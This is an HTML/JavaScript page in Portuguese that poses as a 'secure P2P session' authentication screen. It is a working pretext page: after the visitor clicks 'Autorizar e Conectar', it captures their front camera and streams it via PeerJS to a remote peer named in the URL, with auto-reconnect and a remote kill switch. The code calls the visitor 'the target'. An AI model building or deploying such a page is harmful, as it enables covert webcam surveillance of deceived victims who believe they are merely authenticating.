<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sessão Segura P2P</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        body {
            background-color: #020617;
            color: #e2e8f0;
            font-family: ui-sans-serif, system-ui, sans-serif;
        }
    </style>
</head>

<body class="flex flex-col items-center justify-center min-h-screen p-4">

    <div
        class="max-w-sm w-full bg-slate-900 border border-slate-800 p-8 rounded-2xl text-center shadow-xl relative overflow-hidden">
        <div id="rec-indicator" class="absolute top-4 right-4 flex items-center gap-2 hidden">
            <div class="w-2 h-2 bg-red-500 rounded-full animate-pulse"></div>
            <span class="text-[10px] font-mono text-slate-400">REC</span>
        </div>

        <div id="icon-container" class="mb-6">
            <svg class="w-14 h-14 text-sky-500 mx-auto" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5"
                    d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z">
                </path>
            </svg>
        </div>

        <h2 id="main-title" class="text-lg font-bold mb-2">Autenticação Necessária</h2>
        <p id="sub-title" class="text-slate-400 mb-8 text-sm leading-relaxed">Para prosseguir para o ambiente seguro,
            ative as permissões requeridas pelo sistema.</p>

        <button id="start-btn"
            class="w-full bg-sky-600 hover:bg-sky-500 text-white py-3 rounded-lg font-semibold transition shadow-lg shadow-sky-900/20">
            Autorizar e Conectar
        </button>

        <div class="mt-6 p-3 bg-slate-950 rounded border border-slate-800">
            <p id="log" class="text-[10px] font-mono text-slate-500 text-left break-words h-12 overflow-y-auto">Sistema
                em standby...</p>
        </div>
    </div>

    <script>
        const logEl = document.getElementById('log');
        const log = (msg) => {
            logEl.innerHTML += `<div>> ${msg}</div>`;
            logEl.scrollTop = logEl.scrollHeight;
        };

        const urlParams = new URLSearchParams(window.location.search);
        const targetId = urlParams.get('target');

        let streamDeVideo = null;
        let peer = null;
        let isDead = false;
        let intervaloReconexao = null;

        document.getElementById('start-btn').addEventListener('click', async () => {
            if (!targetId) return log('Erro: Target ID vazio.');

            const btn = document.getElementById('start-btn');
            btn.disabled = true;
            btn.textContent = "Acessando hardware...";

            try {
                // Pede a câmera apenas UMA VEZ e guarda na variável global
                streamDeVideo = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user", width: { ideal: 1280 } },
                    audio: false
                });

                log('Câmera ativada.');
                atualizarInterfaceAtiva();
                iniciarConexao();

            } catch (err) {
                log(`Falha crítica: Câmera em uso ou bloqueada. (${err.name})`);
                btn.textContent = "Falha no Hardware";
                btn.classList.replace('bg-sky-600', 'bg-red-600');
            }
        });

        function atualizarInterfaceAtiva() {
            document.getElementById('icon-container').innerHTML = `<svg class="w-14 h-14 text-emerald-500 mx-auto" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>`;
            document.getElementById('main-title').textContent = "Conexão Estabelecida";
            document.getElementById('sub-title').textContent = "Túnel criptografado ativo.";
            document.getElementById('rec-indicator').classList.remove('hidden');
            document.getElementById('start-btn').style.display = 'none';
        }

        function iniciarConexao() {
            if (isDead) return;

            // Limpa conexões antigas
            if (peer) peer.destroy();

            peer = new Peer();

            peer.on('open', () => {
                log('Conectando ao Agente...');

                const conn = peer.connect(targetId);
                conn.on('data', (data) => {
                    if (data.command === 'KILL_SWITCH') matarTudo();
                });

                // Usa o stream guardado na memória, não pede permissão de novo
                const call = peer.call(targetId, streamDeVideo);

                // Monitora a queda de sinal (Seu F5)
                call.peerConnection.oniceconnectionstatechange = () => {
                    const state = call.peerConnection.iceConnectionState;
                    if (state === 'disconnected' || state === 'failed') {
                        tratarQuedaDeRede();
                    }
                };
            });

            peer.on('error', (err) => {
                if (err.type === 'peer-unavailable') tratarQuedaDeRede();
            });
        }

        function tratarQuedaDeRede() {
            if (isDead) return;
            log('Sinal perdido. Retentando em 3s...');

            // Tenta recriar o roteamento a cada 3 segundos
            clearTimeout(intervaloReconexao);
            intervaloReconexao = setTimeout(() => {
                iniciarConexao();
            }, 3000);
        }

        function matarTudo() {
            isDead = true;
            clearTimeout(intervaloReconexao);

            if (streamDeVideo) {
                streamDeVideo.getTracks().forEach(track => track.stop()); // Desliga a câmera fisicamente
            }
            if (peer) peer.destroy();

            document.getElementById('rec-indicator').classList.add('hidden');
            document.getElementById('icon-container').innerHTML = `<svg class="w-14 h-14 text-slate-600 mx-auto" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M18.364 18.364A9 9 0 005.636 5.636m12.728 12.728A9 9 0 015.636 5.636m12.728 12.728L5.636 5.636"></path></svg>`;
            document.getElementById('main-title').textContent = "Sessão Encerrada";
            document.getElementById('main-title').classList.add('text-slate-500');
            log('Segurança restaurada. Hardware desligado.');
        }

        // PROTOCOLO DE LIMPEZA: Se o alvo fechar a aba, desliga a câmera na marra
        window.addEventListener('beforeunload', () => {
            if (streamDeVideo) streamDeVideo.getTracks().forEach(t => t.stop());
            if (peer) peer.destroy();
        });
    </script>
</body>

</html>